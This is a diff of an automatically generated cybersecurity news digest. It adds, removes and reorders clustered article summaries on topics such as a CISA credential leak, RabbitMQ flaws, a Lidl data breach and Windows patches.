 ### Cluster 88d76f4fd8 — score 9
 
@@ -3243,6 +3207,39 @@ The Cybersecurity and Infrastructure Security Agency (CISA) has issued a postmor
   - Published: 2026-07-13T15:03:28+00:00
   - Link: https://krebsonsecurity.com/2026/07/lessons-learned-from-cisas-recent-github-leak/
   - Summary: The Cybersecurity and Infrastructure Security Agency (CISA) has issued a postmortem on a data leak in which a contractor published dozens of internal CISA credentials -- including AWS Govcloud keys -- in a public GitHub repository for almost six months before being notified by KrebsOnSecurity. Experts say the gaps identified in the agency's initial response provide important lessons that all security teams should absorb.
+
+### Cluster 53ef47508e — score 9
+
+- Title: RabbitMQ Flaws Could Leak OAuth Secrets and Expose Cross-Tenant Queue Metadata
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-14T13:48:07+00:00
+- Link: https://thehackernews.com/2026/07/rabbitmq-flaws-could-leak-oauth-secrets.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Cybersecurity researchers have disclosed details of two access control-related flaws impacting the RabbitMQ message broker service that could allow attackers to leak OAuth client secrets, expose enterprise messaging infrastructure to takeover risks, and bypass tenant boundaries. Miggo's security team, which discovered and reported the flaws, said one "leaks the broker's confidential OAuth
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: RabbitMQ Flaws Could Leak OAuth Secrets and Expose Cross-Tenant Queue Metadata
+  - Published: 2026-07-14T13:48:07+00:00
+  - Link: https://thehackernews.com/2026/07/rabbitmq-flaws-could-leak-oauth-secrets.html
+  - Summary: Cybersecurity researchers have disclosed details of two access control-related flaws impacting the RabbitMQ message broker service that could allow attackers to leak OAuth client secrets, expose enterprise messaging infrastructure to takeover risks, and bypass tenant boundaries. Miggo's security team, which discovered and reported the flaws, said one "leaks the broker's confidential OAuth
 
 ### Cluster aad8380132 — score 9
 
@@ -3297,16 +3294,16 @@ Graham Cluley @ 12:19 am, July 9, 2026 @grahamcluley.com / grahamcluley A 15-yea
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: data_breach, phishing_social_eng
+- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
 - affected_industries: education, financial_services, retail_ecommerce
-- affected_products: Google Cloud
+- affected_products: Apple iOS/macOS, Google Cloud
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: phishing_social_eng, data_breach
+- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
 - affected_industries: financial_services, education, retail_ecommerce
-- affected_products: Google Cloud
+- affected_products: Apple iOS/macOS, Google Cloud
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
@@ -3319,7 +3316,7 @@ Supermarket giant Lidl has revealed details of a supplier breach impacting custo
 #### Full body
 
 ```
-Infosecurity Magazine Home » News » Lidl Notifies Customers of Third-Party Data Breach Lidl Notifies Customers of Third-Party Data Breach News 14 July 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster Lidl has warned customers in several European countries to beware of phishing messages after revealing that their personal information may have been stolen from a third-party IT provider. The supermarket giant, owned by German retail conglomerate Schwarz Group, said customers in Germany, Belgium and the Netherlands were impacted by the incident. In a note to Belgian and Dutch customers , Lidl said it found out about the incident last week. “Despite high IT security standards, unidentified individuals were briefly able to access a separately stored file containing customer data and steal some of it. The online shop system itself was not affected,” it explained. Read more on retail breaches: Food Retailer Ahold Delhaize Discloses Data Breach Impacting 2.2 Million Lidl said that customers of its online store were affected, with stolen data including full names, phone numbers, email addresses, dates of birth and customer numbers. “At this time, we can rule out the possibility that passwords, billing and delivery addresses, bank details, or other payment information are affected,” it continued. “Your customer account has not been compromised. Although we currently have no concrete evidence of data misuse, we are warning you, as a precaution, against possible phishing or identity theft attempts.” Lidl said its IT service provider “reacted immediately” to restore the security of the impacted systems and engage forensics experts to investigate further. The relevant authorities have also been contacted. Customer Vigilance is Required Lidl warned of potential follow-on phishing attacks from fraudsters who may now be in possession of the stolen data. “Always verify the sender's authenticity,” it said. “If you notice anything unusual, do not disclose any data or click on any unknown links.” Boris Cipot, principal security engineer at app security firm Black Duck, praised Lidl for its speedy response and transparency. “That kind of candor presents the appropriate posture under GDPR,” he continued. “The real test now is follow-through: how quickly they complete the forensic investigation, how clearly they communicate updates as the scope becomes known, and how rigorously they reassess the security requirements they place on their service providers going forward.” Cipot urged customers to change their passwords out of caution, enable multi-factor authentication wherever it's offered, and be on high alert. “Attackers will absolutely weaponize this stolen data to craft convincing scams in the weeks and months ahead,” he added. “Monitor your bank and card statements closely, and consider a credit freeze if you're in a jurisdiction where that's available." You may also like West Ham Supporters’ Personal Details Leaked on Club Website News 9 March 2021 Improving Cybersecurity within Higher Education Opinion 2 February 2021 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Augusta Health Center Reveals Historic Breach News 21 August 2018 Crafting Scams with AI: a Devastating New Vector Blog 29 March 2023 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Russian State Hackers Target Vulnerable Routers Worldwide, Joint Advisory Warns News 13 July 2026 1 Progress Software Warns of "External Security Threat" to ShareFile News 13 July 2026 2 75% CISOs Fear Executives Don’t Understand Cybersecurity Risks Employees Face News 9 July 2026 3 NCSC Touts National Scale, AI-Powered “Cyber Shield” for Defense News 8 July 2026 4 Novel OAuth Client ID Spoofing Technique Targets Cloud Environments News 13 July 2026 5 Suspected Chinese Threat Group Targets Universities via Vulnerable Roundcube Servers News 7 July 2026 6 Google Cloud's New CISO Ch
+Infosecurity Magazine Home » News » Lidl Notifies Customers of Third-Party Data Breach Lidl Notifies Customers of Third-Party Data Breach News 14 July 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster Lidl has warned customers in several European countries to beware of phishing messages after revealing that their personal information may have been stolen from a third-party IT provider. The supermarket giant, owned by German retail conglomerate Schwarz Group, said customers in Germany, Belgium and the Netherlands were impacted by the incident. In a note to Belgian and Dutch customers , Lidl said it found out about the incident last week. “Despite high IT security standards, unidentified individuals were briefly able to access a separately stored file containing customer data and steal some of it. The online shop system itself was not affected,” it explained. Read more on retail breaches: Food Retailer Ahold Delhaize Discloses Data Breach Impacting 2.2 Million Lidl said that customers of its online store were affected, with stolen data including full names, phone numbers, email addresses, dates of birth and customer numbers. “At this time, we can rule out the possibility that passwords, billing and delivery addresses, bank details, or other payment information are affected,” it continued. “Your customer account has not been compromised. Although we currently have no concrete evidence of data misuse, we are warning you, as a precaution, against possible phishing or identity theft attempts.” Lidl said its IT service provider “reacted immediately” to restore the security of the impacted systems and engage forensics experts to investigate further. The relevant authorities have also been contacted. Customer Vigilance is Required Lidl warned of potential follow-on phishing attacks from fraudsters who may now be in possession of the stolen data. “Always verify the sender's authenticity,” it said. “If you notice anything unusual, do not disclose any data or click on any unknown links.” Boris Cipot, principal security engineer at app security firm Black Duck, praised Lidl for its speedy response and transparency. “That kind of candor presents the appropriate posture under GDPR,” he continued. “The real test now is follow-through: how quickly they complete the forensic investigation, how clearly they communicate updates as the scope becomes known, and how rigorously they reassess the security requirements they place on their service providers going forward.” Cipot urged customers to change their passwords out of caution, enable multi-factor authentication wherever it's offered, and be on high alert. “Attackers will absolutely weaponize this stolen data to craft convincing scams in the weeks and months ahead,” he added. “Monitor your bank and card statements closely, and consider a credit freeze if you're in a jurisdiction where that's available." You may also like West Ham Supporters’ Personal Details Leaked on Club Website News 9 March 2021 Improving Cybersecurity within Higher Education Opinion 2 February 2021 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Augusta Health Center Reveals Historic Breach News 21 August 2018 Crafting Scams with AI: a Devastating New Vector Blog 29 March 2023 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice US: Pentagon Suspends CMMC Phase II Requirements for Defense Contractors News 14 July 2026 1 Progress Software Warns of "External Security Threat" to ShareFile News 13 July 2026 2 Hacker Extradited from Ukraine Pleads Guilty to Ryuk Ransomware Charges News 13 July 2026 3 Researchers Claim First Fully Agentic Ransomware: JadePuffer News 6 July 2026 4 New MacOS Malware Exploits Legitimate Developer ID to Pose as Apple Crash Reporter News 14 July 2026 5 Lidl Notifies Customers of Third-Party Data Breach News 14 July 2026 6 Google Cloud's New CISO Chris Betz on Integrating AI in Cybe
 ```
 
 #### Corroborating sources (1)
@@ -3461,6 +3458,39 @@ Blog Vulnify: Giving Your Agents a CVE Brain July 09, 2026 Vulnify: Giving Your 
   - Published: 2026-07-09T04:00:00+00:00
   - Link: https://trustedsec.com/blog/vulnify-giving-your-agents-a-cve-brain
   - Summary: <p>The CVE brain your AI agent has been missing. In this blog, we introduce Vulnify, an open-source tool that stitches eight authoritative vulnerability databases into a single offline source of truth for CVE intelligence.</p>
+
+### Cluster d1c5b97119 — score 8
+
+- Title: OWASP API Security Top 10 (2023): A Cloud-Native Guide for Security Teams
+- Source: Orca Security Research (cloud_identity_infrastructure)
+- Published: 2026-07-14T17:50:09+00:00
+- Link: https://orca.security/resources/blog/owasp-api-security-top-10/
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+The Open Web Application Security Project (OWASP) API Security Top 10 focuses on understanding and mitigating vulnerabilities and security risks of APIs.
+```
+
+#### Corroborating sources (1)
+
+- **Orca Security Research** (cloud_identity_infrastructure)
+  - Title: OWASP API Security Top 10 (2023): A Cloud-Native Guide for Security Teams
+  - Published: 2026-07-14T17:50:09+00:00
+  - Link: https://orca.security/resources/blog/owasp-api-security-top-10/
+  - Summary: The Open Web Application Security Project (OWASP) API Security Top 10 focuses on understanding and mitigating vulnerabilities and security risks of APIs.
 
 ### Cluster a7c8d38805 — score 8
 
@@ -3802,39 +3832,6 @@ The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) e
   - Link: https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat
   - Summary: The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days.
 
-### Cluster 0c18a9b765 — score 8
-
-- Title: lobste.rs is now running on SQLite
-- Source: Simon Willison (ai_security_agentic_risk)
-- Published: 2026-07-14T19:44:11+00:00
-- Link: https://simonwillison.net/2026/Jul/14/lobsters-sqlite/#atom-everything
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-lobste.rs is now running on SQLite Community site Lobsters has been planning a migration away from MariaDB since August 2018 - originally targeting PostgreSQL, but last year they decided to investigate SQLite instead. This weekend they completed the migration, and now consider it stable enough that it looks like this is the permanent architecture for the site going forward: SQLite seems to have passed with flying colors: cpu usage is down, memory usage is down, site seems to be snappier at least for me, 1/2 the vps cost once mariadb vps is taken down The Lobsters Rails application now runs on a single VPS, with a primary content SQLite database file that's around 3.8GB. There's also a 1.1GB cache database, a 218MB queue database, and a still growing 555MB rack_attack database used by the Rack::Attack middleware for blocking and throttling abusive requests. There are plenty more details in both the linked thread and this SQLite migration PR by Thomas Dziedzic, which added 735 lines and
-```
-
-#### Corroborating sources (1)
-
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: lobste.rs is now running on SQLite
-  - Published: 2026-07-14T19:44:11+00:00
-  - Link: https://simonwillison.net/2026/Jul/14/lobsters-sqlite/#atom-everything
-  - Summary: lobste.rs is now running on SQLite Community site Lobsters has been planning a migration away from MariaDB since August 2018 - originally targeting PostgreSQL, but last year they decided to investigate SQLite instead. This weekend they completed the migration, and now consider it stable enough that it looks like this is the permanent architecture for the site going forward: SQLite seems to have passed with flying colors: cpu usage is down, memory usage is down, site seems to be snappier at least for me, 1/2 the vps cost once mariadb vps is taken down The Lobsters Rails application now runs on a single VPS, with a primary content SQLite database file that's around 3.8GB. There's also a 1.1GB cache database, a 218MB queue database, and a still growing 555MB rack_attack database used by the Rack::Attack middleware for blocking and throttling abusive requests. There are plenty more details in both the linked thread and this SQLite migration PR by Thomas Dziedzic, which added 735 lines and
-
 ### Cluster 152995b5e9 — score 8
 
 - Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
@@ -3936,12 +3933,12 @@ Cybersecurity agencies from 12 countries have warned that Russian state-backed h
   - Link: https://www.infosecurity-magazine.com/news/russian-state-hackers-vulnerable/
   - Summary: Cybersecurity agencies from 12 countries have warned that Russian state-backed hackers are actively targeting vulnerable routers using weak SNMP credentials
 
-### Cluster 11dc0803a0 — score 8
+### Cluster 68d500837a — score 8
 
-- Title: Nearly 300 GitHub repos pose as legit software to push malware
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-07-14T19:15:17+00:00
-- Link: https://www.bleepingcomputer.com/news/security/nearly-300-github-repos-pose-as-legit-software-to-push-malware/
+- Title: datasette code-frequency chart on GitHub
+- Source: Simon Willison (ai_security_agentic_risk)
+- Published: 2026-07-13T21:45:27+00:00
+- Link: https://simonwillison.net/2026/Jul/13/datasette-code-frequency/#atom-everything
 - Fetch status: not_attempted
 - Member count: 3
 - Corroborating source count: 3
@@ -3955,71 +3952,31 @@ Cybersecurity agencies from 12 countries have warned that Russian state-backed h
 - confidence_tier: tier_2_operator, tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: credential_theft
 - affected_products: GitHub
+- tools_used: OpenAI/ChatGPT
 - content_type: news_report
-- confidence_tier: tier_4_news
+- confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-A threat actor has published hundreds of fake GitHub repositories impersonating legitimate software and security projects to distribute infostealer malware. [...]
+datasette code-frequency chart on GitHub Out of curiosity I decided to see if I could find a useful illustration of the impact of coding agents and Opus 4.5 class models on my own output. The best I've found so far is this GitHub chart of frequency of code changes to my Datasette open source project: The big spike in activity at the end aligns with Opus 4.8, GPT-5.5, Fable 5 and GPT-5.6 Sol. Tags: github , ai , datasette , generative-ai , llms , ai-assisted-programming , coding-agents
 ```
 
 #### Corroborating sources (3)
 
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Nearly 300 GitHub repos pose as legit software to push malware
-  - Published: 2026-07-14T19:15:17+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/nearly-300-github-repos-pose-as-legit-software-to-push-malware/
-  - Summary: A threat actor has published hundreds of fake GitHub repositories impersonating legitimate software and security projects to distribute infostealer malware. [...]
 - **Simon Willison** (ai_security_agentic_risk)
   - Title: datasette code-frequency chart on GitHub
   - Published: 2026-07-13T21:45:27+00:00
   - Link: https://simonwillison.net/2026/Jul/13/datasette-code-frequency/#atom-everything
   - Summary: datasette code-frequency chart on GitHub Out of curiosity I decided to see if I could find a useful illustration of the impact of coding agents and Opus 4.5 class models on my own output. The best I've found so far is this GitHub chart of frequency of code changes to my Datasette open source project: The big spike in activity at the end aligns with Opus 4.8, GPT-5.5, Fable 5 and GPT-5.6 Sol. Tags: github , ai , datasette , generative-ai , llms , ai-assisted-programming , coding-agents
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Nearly 300 GitHub repos pose as legit software to push malware
+  - Published: 2026-07-14T19:15:17+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/nearly-300-github-repos-pose-as-legit-software-to-push-malware/
+  - Summary: A threat actor has published hundreds of fake GitHub repositories impersonating legitimate software and security projects to distribute infostealer malware. [...]
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Dormant GitHub Accounts Help Attackers Blend In While Mapping Corporate Orgs
   - Published: 2026-07-09T18:38:49+00:00
   - Link: https://thehackernews.com/2026/07/dormant-github-accounts-help-attackers.html
   - Summary: Datadog Security Labs is warning of "several overlapping campaigns" that are systematically enumerating corporate GitHub organizations, repositories, and user accounts through the GitHub API. "Operators rely on automated scraping tooling with custom or legitimate-sounding user agents, leveraging GitHub 'ghost' accounts that are often years old, or compromised OAuth tokens and personal
-
-### Cluster f3622fdee9 — score 8
-
-- Title: Microsoft releases Windows 10 KB5099539 extended security update
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-07-14T18:49:28+00:00
-- Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-releases-windows-10-kb5099539-extended-security-update/
-- Fetch status: not_attempted
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: Microsoft Windows
-
-#### Cluster taxonomy (union across members)
-- affected_products: Microsoft Windows
-- content_type: news_report
-- confidence_tier: tier_4_news, tier_5_chatter
-
-#### Primary article taxonomy
-- affected_products: Microsoft Windows
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Microsoft has released the Windows 10 KB5099539 extended security update, which includes the July 2026 Patch Tuesday security updates for 570 vulnerabilities, along with additional security fixes. [...]
-```
-
-#### Corroborating sources (2)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Microsoft releases Windows 10 KB5099539 extended security update
-  - Published: 2026-07-14T18:49:28+00:00
-  - Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-releases-windows-10-kb5099539-extended-security-update/
-  - Summary: Microsoft has released the Windows 10 KB5099539 extended security update, which includes the July 2026 Patch Tuesday security updates for 570 vulnerabilities, along with additional security fixes. [...]
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: Drift Corpus: binary diffs of 240+ 2026 Windows kernel patches
-  - Published: 2026-07-08T16:24:55+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1uqxlxq/drift_corpus_binary_diffs_of_240_2026_windows/
-  - Summary: Patch Tuesday confirms a CVE is fixed but not what changed in the binary, which function, which check, or whether it's a real fix or just churn. The Drift Corpus is a diff of 240+ 2026 Windows kernel patches. Per entry: the changed functions with assembly, the bug class and call chain, WinDbg breakpoints to reproduce, and a plain-English root cause. Browse: https://byteray-ai.github.io/drift-corpus Repo: https://github.com/ByteRay-AI/drift-corpus This repository breaks down Microsoft’s monthly kernel patches into clear binary changes, giving researchers a practical roadmap to find adjacent bugs, build faster EDR detections, and write precise firewall and network rules to block exploits at the perimeter. submitted by /u/Emergency_Stable_923 [link] [comments]
